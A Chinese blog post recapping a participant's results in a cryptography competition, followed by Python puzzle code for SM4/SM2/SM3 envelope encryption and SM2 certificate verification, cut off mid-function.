    <content type="html"><![CDATA[<p>很好，属于是来<strong>重庆旅</strong>游来了，先爆一下战绩，初始谜题做了一个，差点爆零(bushi)</p><p>去年还能做两个初始谜题，后面的夺旗闯关还能有点思路，就是不会写而已</p><p>今年的夺旗闯关就真不会了，看得懂一点，但具体不知道要干嘛，<strong>证书 sm4 sm2</strong> 什么的不会啊</p><p><strong>Rank: 90+/205</strong>，去年好像也是90多，但今年参赛队伍多了不少，难度也难了不少，都没人AK了()，去年四五支队伍AK，我那一列就两三个……</p><p><img src="https://picx.zhimg.com/80/v2-e27b748bcf186cc8475d699cc535386a_1440w.png" alt=""></p><h2 id="初始谜题1"><a href="#初始谜题1" class="headerlink" title="初始谜题1*"></a>初始谜题1*</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># sm4_encrypt.py</span></span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">from</span> pyasn1.codec.der.decoder <span class="keyword">import</span> decode</span><br><span class="line"><span class="keyword">from</span> pyasn1.<span class="built_in">type</span> <span class="keyword">import</span> univ, namedtype</span><br><span class="line"><span class="keyword">from</span> cryptography.hazmat.primitives.ciphers <span class="keyword">import</span> Cipher, algorithms, modes</span><br><span class="line"><span class="keyword">from</span> cryptography.hazmat.backends <span class="keyword">import</span> default_backend</span><br><span class="line"><span class="keyword">from</span> gmssl <span class="keyword">import</span> sm3, func, sm2</span><br><span class="line"><span class="keyword">from</span> pyasn1.codec.der.encoder <span class="keyword">import</span> encode</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">SM2Cipher</span>(univ.<span class="type">Sequence</span>):</span><br><span class="line">    componentType = namedtype.NamedTypes(</span><br><span class="line">        namedtype.NamedType(<span class="string">&#x27;xCoordinate&#x27;</span>, univ.Integer()), <span class="comment"># -- x 分量</span></span><br><span class="line">        namedtype.NamedType(<span class="string">&#x27;yCoordinate&#x27;</span>, univ.Integer()),             <span class="comment"># -- y 分量</span></span><br><span class="line">        namedtype.NamedType(<span class="string">&#x27;hash&#x27;</span>, univ.OctetString()),                <span class="comment"># --哈希值</span></span><br><span class="line">        namedtype.NamedType(<span class="string">&#x27;cipherText&#x27;</span>, univ.OctetString())           <span class="comment"># -- SM4密钥密文</span></span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">EncryptedData</span>(univ.<span class="type">Sequence</span>):</span><br><span class="line">    componentType = namedtype.NamedTypes(</span><br><span class="line">        namedtype.NamedType(<span class="string">&#x27;algorithm&#x27;</span>, univ.ObjectIdentifier(<span class="string">&#x27;1.2.156.10197.1.104.2&#x27;</span>)), <span class="comment"># -- SM4-CBC OID</span></span><br><span class="line">        namedtype.NamedType(<span class="string">&#x27;iv&#x27;</span>, univ.OctetString()),                                                <span class="comment"># -- SM4-CBC加密使用的初始化向量（IV）</span></span><br><span class="line">        namedtype.NamedType(<span class="string">&#x27;cipherText&#x27;</span>, univ.OctetString())                                         <span class="comment"># -- SM4加密的密文</span></span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">EnvelopedData</span>(univ.<span class="type">Sequence</span>):</span><br><span class="line">    componentType = namedtype.NamedTypes(</span><br><span class="line">        namedtype.NamedType(<span class="string">&#x27;encryptedKey&#x27;</span>, SM2Cipher()),                           <span class="comment"># -- 使用SM2公钥加密SM4密钥的密文</span></span><br><span class="line">        namedtype.NamedType(<span class="string">&#x27;encryptedData&#x27;</span>, EncryptedData()),                                  <span class="comment">#  -- 使用SM4密钥对明文加密的密文</span></span><br><span class="line">        namedtype.NamedType(<span class="string">&#x27;digestAlgorithm&#x27;</span>, univ.ObjectIdentifier(<span class="string">&#x27;1.2.156.10197.1.401.1&#x27;</span>)), <span class="comment"># -- SM3算法OID</span></span><br><span class="line">        namedtype.NamedType(<span class="string">&#x27;digest&#x27;</span>, univ.OctetString())                                       <span class="comment"># -- 对明文计算的摘要值</span></span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sm4_cbc_encrypt</span>(<span class="params">plaintext: <span class="built_in">bytes</span>, key: <span class="built_in">bytes</span>, iv: <span class="built_in">bytes</span></span>):</span><br><span class="line">    backend = default_backend()</span><br><span class="line">    cipher = Cipher(algorithms.SM4(key), modes.CBC(iv), backend=backend) <span class="comment">#填充模式 nopadding</span></span><br><span class="line">    encryptor = cipher.encryptor()</span><br><span class="line">    ciphertext = encryptor.update(plaintext) + encryptor.finalize()</span><br><span class="line">    <span class="keyword">return</span> ciphertext</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sm2_encrypt</span>(<span class="params">plaintext: <span class="built_in">bytes</span>,public_key:<span class="built_in">bytes</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">    sm2_crypt = sm2.CryptSM2(private_key=<span class="string">&quot;&quot;</span>,public_key=public_key.<span class="built_in">hex</span>())</span><br><span class="line">    ciphertext = sm2_crypt.encrypt(plaintext)</span><br><span class="line">    <span class="keyword">return</span> ciphertext</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sm3_hash</span>(<span class="params">text:<span class="built_in">bytes</span></span>):</span><br><span class="line">    hash_value = sm3.sm3_hash(func.bytes_to_list(text))</span><br><span class="line">    <span class="keyword">return</span> hash_value</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read_key_from_file</span>(<span class="params">file_path</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">            key = file.read().strip()</span><br><span class="line">            <span class="keyword">return</span> key</span><br><span class="line">    <span class="keyword">except</span> FileNotFoundError:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;错误: 文件 <span class="subst">&#123;file_path&#125;</span> 未找到。&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;错误: 发生了未知错误 <span class="subst">&#123;e&#125;</span>。&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 对由abcd组成的字符串加密的方法</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sm4_encrypt</span>(<span class="params">plaintext:<span class="built_in">str</span>,sm2_public_key: <span class="built_in">str</span>,sm4_iv:<span class="built_in">str</span></span>):</span><br><span class="line">    sm4_key = <span class="built_in">bytes</span>.fromhex(read_key_from_file(<span class="string">&quot;key.txt&quot;</span>)) <span class="comment">#从文件读取固定的key</span></span><br><span class="line">    <span class="comment"># sm4</span></span><br><span class="line">    envelope = EnvelopedData()</span><br><span class="line">    plaintext_bytes = plaintext.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    ciphertext = sm4_cbc_encrypt(plaintext_bytes,sm4_key,<span class="built_in">bytes</span>.fromhex(sm4_iv))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># sm2</span></span><br><span class="line">    encrypted_key = sm2_encrypt(sm4_key,<span class="built_in">bytes</span>.fromhex(sm2_public_key))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># sm3</span></span><br><span class="line">    digest = sm3_hash(plaintext_bytes)</span><br><span class="line"></span><br><span class="line">    envelope[<span class="string">&#x27;encryptedData&#x27;</span>] = EncryptedData()</span><br><span class="line">    envelope[<span class="string">&#x27;encryptedData&#x27;</span>][<span class="string">&#x27;iv&#x27;</span>] = univ.OctetString(<span class="built_in">bytes</span>.fromhex(sm4_iv))</span><br><span class="line">    envelope[<span class="string">&#x27;encryptedData&#x27;</span>][<span class="string">&#x27;cipherText&#x27;</span>] = univ.OctetString(ciphertext)</span><br><span class="line"></span><br><span class="line">    envelope[<span class="string">&#x27;encryptedKey&#x27;</span>] = SM2Cipher()</span><br><span class="line">    envelope[<span class="string">&#x27;encryptedKey&#x27;</span>][<span class="string">&#x27;xCoordinate&#x27;</span>] = univ.Integer(<span class="built_in">int</span>.from_bytes(encrypted_key[:<span class="number">32</span>], <span class="string">&#x27;big&#x27;</span>))</span><br><span class="line">    envelope[<span class="string">&#x27;encryptedKey&#x27;</span>][<span class="string">&#x27;yCoordinate&#x27;</span>] = univ.Integer(<span class="built_in">int</span>.from_bytes(encrypted_key[<span class="number">32</span>:<span class="number">64</span>], <span class="string">&#x27;big&#x27;</span>))</span><br><span class="line">    envelope[<span class="string">&#x27;encryptedKey&#x27;</span>][<span class="string">&#x27;hash&#x27;</span>] = univ.OctetString(encrypted_key[<span class="number">64</span>:<span class="number">96</span>])</span><br><span class="line">    envelope[<span class="string">&#x27;encryptedKey&#x27;</span>][<span class="string">&#x27;cipherText&#x27;</span>] = univ.OctetString(encrypted_key[<span class="number">96</span>:])</span><br><span class="line"></span><br><span class="line">    envelope[<span class="string">&#x27;digest&#x27;</span>] = univ.OctetString(<span class="built_in">bytes</span>.fromhex(digest))</span><br><span class="line">    <span class="keyword">return</span> encode(envelope).<span class="built_in">hex</span>()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 从asn1格式的16进制字符串提取参数</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">asn1_parse</span>(<span class="params">asn1_hex_str:<span class="built_in">str</span>,asn1_spec</span>):</span><br><span class="line">    <span class="comment"># 将16进制字符串转换为字节</span></span><br><span class="line">    der_bytes = binascii.unhexlify(asn1_hex_str)</span><br><span class="line">    <span class="comment"># 解码为ASN.1对象</span></span><br><span class="line">    enveloped_data, _ = decode(der_bytes, asn1Spec=asn1_spec)</span><br><span class="line">    <span class="comment"># sm2</span></span><br><span class="line">    sm2_x = <span class="built_in">hex</span>(<span class="built_in">int</span>(enveloped_data[<span class="string">&#x27;encryptedKey&#x27;</span>][<span class="string">&#x27;xCoordinate&#x27;</span>]))[<span class="number">2</span>:]</span><br><span class="line">    sm2_y = <span class="built_in">hex</span>(<span class="built_in">int</span>(enveloped_data[<span class="string">&#x27;encryptedKey&#x27;</span>][<span class="string">&#x27;yCoordinate&#x27;</span>]))[<span class="number">2</span>:]</span><br><span class="line">    sm2_hash = enveloped_data[<span class="string">&#x27;encryptedKey&#x27;</span>][<span class="string">&#x27;hash&#x27;</span>].asOctets().<span class="built_in">hex</span>()</span><br><span class="line">    sm2_ciphertext = enveloped_data[<span class="string">&#x27;encryptedKey&#x27;</span>][<span class="string">&#x27;cipherText&#x27;</span>].asOctets().<span class="built_in">hex</span>()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># sm4</span></span><br><span class="line">    sm4_algorithm = <span class="built_in">str</span>(enveloped_data[<span class="string">&#x27;encryptedData&#x27;</span>][<span class="string">&#x27;algorithm&#x27;</span>])</span><br><span class="line">    sm4_iv = enveloped_data[<span class="string">&#x27;encryptedData&#x27;</span>][<span class="string">&#x27;iv&#x27;</span>].asOctets().<span class="built_in">hex</span>()</span><br><span class="line">    sm4_cipherText = enveloped_data[<span class="string">&#x27;encryptedData&#x27;</span>][<span class="string">&#x27;cipherText&#x27;</span>].asOctets().<span class="built_in">hex</span>()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># sm3</span></span><br><span class="line">    digestAlgorithm = <span class="built_in">str</span>(enveloped_data[<span class="string">&#x27;digestAlgorithm&#x27;</span>])</span><br><span class="line">    digest = enveloped_data[<span class="string">&#x27;digest&#x27;</span>].asOctets().<span class="built_in">hex</span>()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 输出提取的值</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;asn1格式的16进制字符串:&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;  asn1: <span class="subst">&#123;asn1_hex_str&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;SM2参数:&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;  xCoordinate: <span class="subst">&#123;sm2_x&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;  yCoordinate: <span class="subst">&#123;sm2_y&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;  hash: <span class="subst">&#123;sm2_hash&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;  cipherText: <span class="subst">&#123;sm2_ciphertext&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;SM4参数:&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;  algorithm: <span class="subst">&#123;sm4_algorithm&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;  iv: <span class="subst">&#123;sm4_iv&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;  cipherText: <span class="subst">&#123;sm4_cipherText&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;SM3参数:&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;  digestAlgorithm: <span class="subst">&#123;digestAlgorithm&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;  digest: <span class="subst">&#123;digest&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    plaintext = <span class="string">&quot;6163616263626161626461646464636361626263626464626361616164636462636462646461646461626462646361636264616364646462646462626261636261646163626463636262616462646462616362616363646463646361616263646261636164636263646163646161636164646364646261626463636462636162636162646261626163636161616463616261646264616162646162626162626462616363616161636362616461626463616462646261626264626464626262636363636162616261626163616164616462626163636164646161646361626363646462626261636261636164646262646362616263636363626461636164646261636361646463616161626164626461636163636461646164616161616163616164636164646261646163626163636164616162636263616461636261646264626263626264636164646263616164626463626461646364616362626261616262616264616361626264636264616461646163626364626462636161636262636163616261616262626362636463616263616364616363626163636363636262646363616464626461616363646361626162636261636364646362626462616364626462626161616264636162626263626462626264646162626462616261616264626161616363636364616263626461636162616462616363616461646363636261636363616162646164626361616464646463646263646363636164626164646463646361636364616261626261646461646463626161616361626161626362626262636164626463636163626163616163636262646463646162616363616364636164646364626464626164626162636161616263646164636461626161636262646463636462646161636462626264626463646364636362626264616362646462636263616361626262616464636263616464616363646163616262616162626261626261616461636361636164636162626461646264636162646363636263616363646161636464626161616462636464646164616361646264616361626263646264616162636164636462616164646163616461646362626464&quot;</span></span><br><span class="line">    sm2_key = <span class="string">&quot;044f66804d1d30f4499377b96dc8e18faab8300ebddf3eb0fa2065214c260d64c08c6dfe7d9923d6d5baa3a0512a2ede03357c723230ebf77906f82dc1b0fccc1e&quot;</span></span><br><span class="line">    iv = <span class="string">&quot;43d4192f9f74e90543d4192f9f74e905&quot;</span></span><br><span class="line">    asn1_hex_str = sm4_encrypt(<span class="built_in">bytes</span>.fromhex(plaintext).decode(<span class="string">&#x27;utf-8&#x27;</span>),sm2_key,iv)</span><br><span class="line">    asn1_parse(asn1_hex_str,EnvelopedData())</span><br></pre></td></tr></table></figure><h2 id="初始谜题2"><a href="#初始谜题2" class="headerlink" title="初始谜题2*"></a>初始谜题2*</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># sm2_verify.py</span></span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> datetime</span><br><span class="line"><span class="keyword">from</span> pyasn1.<span class="built_in">type</span> <span class="keyword">import</span> univ, namedtype</span><br><span class="line"><span class="keyword">from</span> pyasn1.codec.der.encoder <span class="keyword">import</span> encode</span><br><span class="line"><span class="keyword">from</span> pyasn1.codec.der.decoder <span class="keyword">import</span> decode</span><br><span class="line"><span class="keyword">from</span> gmssl <span class="keyword">import</span> sm2</span><br><span class="line"><span class="keyword">from</span> pyasn1.codec.der <span class="keyword">import</span> decoder, encoder</span><br><span class="line"><span class="keyword">from</span> pyasn1_modules <span class="keyword">import</span> rfc2459</span><br><span class="line"><span class="keyword">from</span> gmssl.sm2 <span class="keyword">import</span> CryptSM2</span><br><span class="line"><span class="keyword">from</span> pyasn1.<span class="built_in">type</span>.useful <span class="keyword">import</span> GeneralizedTime</span><br><span class="line"><span class="keyword">from</span> pyasn1.<span class="built_in">type</span>.univ <span class="keyword">import</span> <span class="type">Sequence</span></span><br><span class="line"><span class="keyword">from</span> pyasn1.<span class="built_in">type</span> <span class="keyword">import</span> useful</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ECPrimeFieldConfig</span>(univ.<span class="type">Sequence</span>):</span><br><span class="line">    componentType = namedtype.NamedTypes(</span><br><span class="line">        namedtype.NamedType(<span class="string">&#x27;fieldType&#x27;</span>, univ.ObjectIdentifier(<span class="string">&#x27;1.2.840.10045.1.1&#x27;</span>)),  <span class="comment"># Prime field OID</span></span><br><span class="line">        namedtype.NamedType(<span class="string">&#x27;prime&#x27;</span>, univ.Integer()),  <span class="comment"># Prime number p</span></span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ECCurveParameters</span>(univ.<span class="type">Sequence</span>):</span><br><span class="line">    componentType = namedtype.NamedTypes(</span><br><span class="line">        namedtype.NamedType(<span class="string">&#x27;coefficientA&#x27;</span>, univ.OctetString()),  <span class="comment"># Curve coefficient a</span></span><br><span class="line">        namedtype.NamedType(<span class="string">&#x27;coefficientB&#x27;</span>, univ.OctetString()),  <span class="comment"># Curve coefficient b</span></span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ECDomainParameters</span>(univ.<span class="type">Sequence</span>):</span><br><span class="line">    componentType = namedtype.NamedTypes(</span><br><span class="line">        namedtype.NamedType(<span class="string">&#x27;version&#x27;</span>, univ.Integer(<span class="number">1</span>)),  <span class="comment"># Version number (1)</span></span><br><span class="line">        namedtype.NamedType(<span class="string">&#x27;fieldParameters&#x27;</span>, ECPrimeFieldConfig()),  <span class="comment"># Field parameters 包含参数oid，p</span></span><br><span class="line">        namedtype.NamedType(<span class="string">&#x27;curveParameters&#x27;</span>, ECCurveParameters()),  <span class="comment"># Curve parameters 包含参数a，b</span></span><br><span class="line">        namedtype.NamedType(<span class="string">&#x27;basePoint&#x27;</span>, univ.OctetString()),  <span class="comment"># Base point G 基点</span></span><br><span class="line">        namedtype.NamedType(<span class="string">&#x27;order&#x27;</span>, univ.Integer()),  <span class="comment"># Order n of base point 参数n</span></span><br><span class="line">        namedtype.NamedType(<span class="string">&#x27;cofactor&#x27;</span>, univ.Integer(<span class="number">1</span>)),  <span class="comment"># Cofactor 余因子 固定值为1</span></span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">SM2SignatureValue</span>(univ.<span class="type">Sequence</span>):</span><br><span class="line">    componentType = namedtype.NamedTypes(</span><br><span class="line">        namedtype.NamedType(<span class="string">&#x27;r&#x27;</span>, univ.Integer()),  <span class="comment"># First part of signature</span></span><br><span class="line">        namedtype.NamedType(<span class="string">&#x27;s&#x27;</span>, univ.Integer()),  <span class="comment"># Second part of signature</span></span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">SM2SignedData</span>(univ.<span class="type">Sequence</span>):</span><br><span class="line">    componentType = namedtype.NamedTypes(</span><br><span class="line">        <span class="comment"># version</span></span><br><span class="line">        namedtype.NamedType(<span class="string">&#x27;version&#x27;</span>, univ.Integer()),</span><br><span class="line">        <span class="comment"># 哈希算法 OID（SM3）</span></span><br><span class="line">        namedtype.NamedType(<span class="string">&#x27;digestAlgorithms&#x27;</span>, univ.ObjectIdentifier()),</span><br><span class="line">        <span class="comment"># 签名值 r, s</span></span><br><span class="line">        namedtype.NamedType(<span class="string">&#x27;sm2Signature&#x27;</span>, SM2SignatureValue()),</span><br><span class="line">        <span class="comment"># 曲线参数</span></span><br><span class="line">        namedtype.NamedType(<span class="string">&#x27;ecDomainParameters&#x27;</span>, ECDomainParameters()),</span><br><span class="line">        <span class="comment"># 证书</span></span><br><span class="line">        namedtype.NamedType(<span class="string">&#x27;certificate&#x27;</span>, univ.OctetString()),</span><br><span class="line">        <span class="comment"># 签名时间</span></span><br><span class="line">        namedtype.NamedType(<span class="string">&#x27;timestamp&#x27;</span>, GeneralizedTime()),</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 输入值全部为16进制字符串,g为x，y坐标的16进制字符串进行拼接</span></span><br><span class="line"><span class="comment"># p,a,b,n,g对应曲线参数;r,s为签名值的两部分</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">asn1_package</span>(<span class="params">version, oid, signature, curve_params, cert_hex, time_stamp</span>):</span><br><span class="line">    sm2_signed_data = SM2SignedData()</span><br><span class="line">    <span class="comment"># version</span></span><br><span class="line">    sm2_signed_data[<span class="string">&#x27;version&#x27;</span>] = version</span><br><span class="line">    <span class="comment"># 哈希算法 OID（SM3）</span></span><br><span class="line">    sm2_signed_data[<span class="string">&#x27;digestAlgorithms&#x27;</span>] = oid</span><br><span class="line">    <span class="comment"># 签名值 r, s</span></span><br><span class="line">    sm2_signed_data[<span class="string">&quot;sm2Signature&quot;</span>] = SM2SignatureValue()</span><br><span class="line">    sm2_signed_data[<span class="string">&quot;sm2Signature&quot;</span>][<span class="string">&#x27;r&#x27;</span>] = <span class="built_in">int</span>(signature[:<span class="number">64</span>], <span class="number">16</span>)</span><br><span class="line">    sm2_signed_data[<span class="string">&quot;sm2Signature&quot;</span>][<span class="string">&#x27;s&#x27;</span>] = <span class="built_in">int</span>(signature[<span class="number">64</span>:], <span class="number">16</span>)</span><br><span class="line">    <span class="comment"># 曲线参数</span></span><br><span class="line">    sm2_signed_data[<span class="string">&quot;ecDomainParameters&quot;</span>] = ECDomainParameters()</span><br><span class="line">    sm2_signed_data[<span class="string">&quot;ecDomainParameters&quot;</span>][<span class="string">&quot;fieldParameters&quot;</span>] = ECPrimeFieldConfig()</span><br><span class="line">    sm2_signed_data[<span class="string">&quot;ecDomainParameters&quot;</span>][<span class="string">&quot;fieldParameters&quot;</span>][<span class="string">&quot;prime&quot;</span>] = <span class="built_in">int</span>(curve_params[<span class="string">&#x27;p&#x27;</span>], <span class="number">16</span>)</span><br><span class="line">    sm2_signed_data[<span class="string">&quot;ecDomainParameters&quot;</span>][<span class="string">&quot;curveParameters&quot;</span>] = ECCurveParameters()</span><br><span class="line">    sm2_signed_data[<span class="string">&quot;ecDomainParameters&quot;</span>][<span class="string">&quot;curveParameters&quot;</span>][<span class="string">&quot;coefficientA&quot;</span>] = univ.OctetString(</span><br><span class="line">        <span class="built_in">bytes</span>.fromhex(curve_params[<span class="string">&#x27;a&#x27;</span>]))</span><br><span class="line">    sm2_signed_data[<span class="string">&quot;ecDomainParameters&quot;</span>][<span class="string">&quot;curveParameters&quot;</span>][<span class="string">&quot;coefficientB&quot;</span>] = univ.OctetString(</span><br><span class="line">        <span class="built_in">bytes</span>.fromhex(curve_params[<span class="string">&#x27;b&#x27;</span>]))</span><br><span class="line">    sm2_signed_data[<span class="string">&quot;ecDomainParameters&quot;</span>][<span class="string">&#x27;basePoint&#x27;</span>] = univ.OctetString(<span class="built_in">bytes</span>.fromhex(<span class="string">&#x27;04&#x27;</span> + curve_params[<span class="string">&#x27;g&#x27;</span>]))</span><br><span class="line">    sm2_signed_data[<span class="string">&quot;ecDomainParameters&quot;</span>][<span class="string">&#x27;order&#x27;</span>] = <span class="built_in">int</span>(curve_params[<span class="string">&#x27;n&#x27;</span>], <span class="number">16</span>)</span><br><span class="line">    <span class="comment"># 证书</span></span><br><span class="line">    sm2_signed_data[<span class="string">&quot;certificate&quot;</span>] = univ.OctetString(<span class="built_in">bytes</span>.fromhex(cert_hex))</span><br><span class="line">    <span class="comment"># 时间</span></span><br><span class="line">    dt = datetime.strptime(time_stamp, <span class="string">&quot;%Y-%m-%d %H:%M:%S&quot;</span>)</span><br><span class="line">    asn1_time_str = dt.strftime(<span class="string">&quot;%Y%m%d%H%M%SZ&quot;</span>)</span><br><span class="line">    sm2_signed_data[<span class="string">&quot;timestamp&quot;</span>] = GeneralizedTime(asn1_time_str)</span><br><span class="line">    <span class="keyword">return</span> encode(sm2_signed_data).<span class="built_in">hex</span>()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Sm2CertVerifier</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, cert_hex: <span class="built_in">str</span></span>):</span><br><span class="line">        ca_pubkey = <span class="string">&quot;8E1860588D9900C16BD19A0FE0A5ACC600224DBD794FFD34179E03698D52421F46E6D8C6E8AADE512C7B543395AC39C76384726C7F8BA537ABCA0C129ECD9882&quot;</span></span><br><span class="line">        self.sm2_crypt = sm2.CryptSM2(public_key=ca_pubkey, private_key=<span class="literal">None</span>)</span><br><span class="line">        self.cert_tbs, self.signature_bytes, self.cert = self.parse_cert(<span class="built_in">bytes</span>.fromhex(cert_hex))</span><br><span class="line"></span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">parse_cert</span>(<span class="params">cert_der_bytes: <span class="built_in">bytes</span></span>):</span><br><span class="line">        cert, _ = decoder.decode(cert_der_bytes, asn1Spec=rfc2459.Certificate())</span><br><span class="line">        tbs = cert.getComponentByName(<span class="string">&#x27;tbsCertificate&#x27;</span>)</span><br><span class="line">        signature_bytes = cert.getComponentByName(<span class="string">&#x27;signatureValue&#x27;</span>).asOctets()</span><br><span class="line">        <span class="keyword">return</span> tbs, signature_bytes, cert</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 获取签名值</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">decode_rs_from_der</span>(<span class="params">self, signature: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">        seq, _ = decode(signature, asn1Spec=<span class="type">Sequence</span>())</span><br><span class="line">        r = <span class="built_in">int</span>(seq[<span class="number">0</span>])</span><br><span class="line">        s = <span class="built_in">int</span>(seq[<span class="number">1</span>])</span><br><span class="line">        r_bytes = r.to_bytes(<span class="number">32</span>, byteorder=<span class="string">&#x27;big&#x27;</span>)</span><br><span class="line">        s_bytes = s.to_bytes(<span class="number">32</span>, byteorder=<span class="string">&#x27;big&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> r_bytes + s_bytes</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">verify_signature</span>(<span class="params">self, signature: <span class="built_in">bytes</span>, tbs: <span class="built_in">str</span></span>):</span><br><span class="line">        inter_cert_tbs_der = encoder.encode(tbs)</span><br><span class="line">        inter_signature = self.decode_rs_from_der(signature)</span><br><span class="line">        <span class="comment"># 验证签名（tbs_der必须完整，签名必须64字节）</span></span><br><span class="line">        <span class="keyword">return</span> self.sm2_crypt.verify_with_sm3(inter_signature.<span class="built_in">hex</span>(), inter_cert_tbs_der)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">verify_certificate_expiration_date</span>(<span class="params">self, tbs</span>):</span><br><span class="line">        validity = tbs.getComponentByName(<span class="string">&#x27;validity&#x27;</span>)</span><br><span class="line">        not_before = validity.getComponentByName(<span class="string">&#x27;notBefore&#x27;</span>).getComponent()</span><br><span class="line">        not_after = validity.getComponentByName(<span class="string">&#x27;notAfter&#x27;</span>).getComponent()</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 处理 UTCTime 和 GeneralizedTime 两种类型</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">isinstance</span>(not_before, useful.UTCTime):</span><br><span class="line">            not_before_time = datetime.strptime(<span class="built_in">str</span>(not_before), <span class="string">&quot;%y%m%d%H%M%SZ&quot;</span>)</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">isinstance</span>(not_before, useful.GeneralizedTime):</span><br><span class="line">            not_before_time = datetime.strptime(<span class="built_in">str</span>(not_before), <span class="string">&quot;%Y%m%d%H%M%SZ&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">raise</span> ValueError(<span class="string">&quot;Unsupported notBefore time format&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">isinstance</span>(not_after, useful.UTCTime):</span><br><span class="line">            not_after_time = datetime.strptime(<span class="built_in">str</span>(not_after), <span class="string">&quot;%y%m%d%H%M%SZ&quot;</span>)</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">isinstance</span>(not_after, useful.GeneralizedTime):</span><br><span class="line">            not_after_time = datetime.strptime(<span class="built_in">str</span>(not_after), <span class="string">&quot;%Y%m%d%H%M%SZ&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">raise</span> ValueError(<span class="string">&quot;Unsupported notAfter time format&quot;</span>)</span><br><span class="line"></span><br><span class="line">        now = datetime.now()</span><br><span class="line">        <span class="keyword">return</span> not_before_time &lt;= now &lt;= not_after_time</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">verify</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="comment"># 